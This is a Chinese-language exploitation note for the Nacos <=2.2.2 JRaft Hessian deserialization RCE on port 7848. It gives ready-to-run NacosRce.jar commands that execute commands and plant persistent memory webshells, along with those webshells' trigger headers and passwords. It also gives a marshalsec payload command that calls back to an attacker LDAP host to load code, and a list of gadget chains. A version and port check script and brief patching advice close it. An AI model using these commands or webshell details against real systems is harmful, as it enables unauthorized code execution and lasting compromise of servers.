## 漏洞描述

Nacos <=2.2.2 版本的JRaft集群通信端口(7848)使用Hessian协议进行序列化通信，存在反序列化漏洞。攻击者可发送精心构造的Hessian序列化数据实现RCE。非集群模式的Nacos同样受影响。

## 影响版本

- Nacos 2.x <= 2.2.2
- Nacos 1.x 全版本

## 利用前提

- JRaft端口7848可达
- 需要JDK 1.8环境（利用工具依赖）

## 利用步骤

### 方式一：NacosRce.jar工具

项目地址: https://github.com/c0olw/NacosRce

**执行命令：**
```bash
java -jar NacosRce.jar http://<target>:8848/nacos 7848 "whoami"
```

**只注入内存马：**
```bash
java -jar NacosRce.jar http://<target>:8848/nacos 7848 memshell
```

**Windows目标：**
```bash
java -jar NacosRce.jar http://<target>:8848 7848 "whoami" windows
```

### 注入的内存马类型

**1. 冰蝎(Behinder)内存马：**
- 请求头: `x-client-data: rebeyond`
- Referer: `https://www.google.com/`
- 路径: 任意
- 密码: `rebeyond`

**2. 哥斯拉(Godzilla)内存马：**
- 请求头: `x-client-data: godzilla`
- Referer: `https://www.google.com/`
- 路径: 任意
- 密码: `pass` 和 `key`

**3. CMD内存马：**
- 请求头: `x-client-data: cmd`
- Referer: `https://www.google.com/`
- 请求头: `cmd: <要执行的命令>`

**注意：内存马在Nacos重启后依然存活。**

### 方式二：marshalsec生成利用链

需要出网环境，使用JNDI LDAP反序列化 + POJONode触发TemplatesImpl：

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian2 SpringPartiallyComparableAdvisorHolder ldap://<vps>:1389/Deserialization/Jackson/nu1r/Base64/<base64编码的命令> | base64
```

将生成的base64数据发送到7848端口。

### 方式三：不出网利用

通过构建利用链直接生成payload，无需出网，但仅能执行命令，不能加载字节码。

### 多种反序列化链

| 链名 | 条件 | 效果 |
|------|------|------|
| SpringPartiallyComparableAdvisorHolder | 需出网(JNDI LDAP) | RCE |
| BCEL | 不需出网 | RCE |
| POJONode + TemplatesImpl | 需出网 | RCE |
| JNDI LDAP | 需出网 | RCE |

## Payload

```python
import requests
import socket

def check_jraft_port(target_ip, port=7848):
    """检测JRaft端口是否开放"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        result = s.connect_ex((target_ip, port))
        s.close()
        if result == 0:
            print(f"[+] {target_ip}:{port} JRaft端口开放，可能存在Hessian反序列化漏洞")
            return True
        else:
            print(f"[-] {target_ip}:{port} JRaft端口未开放")
            return False
    except Exception as e:
        print(f"[-] 检测失败: {e}")
        return False

def check_nacos_version(target):
    """获取Nacos版本判断是否受影响"""
    try:
        r = requests.get(f"{target}/nacos/v1/console/server/state", timeout=10, verify=False)
        if r.status_code == 200:
            version = r.json().get('version', '')
            print(f"[*] Nacos版本: {version}")
            return version
    except:
        pass
    return None

# 使用

# check_nacos_version("http://target:8848")
```

## 修复建议

1. 升级 Nacos 至 2.3.0+ (修复了Hessian反序列化)
2. 使用防火墙限制7848端口的访问，仅允许集群节点间通信
3. 部署WAF/IDS检测异常序列化数据
4. 避免使用JDK 1.8运行Nacos（减少可用利用链）
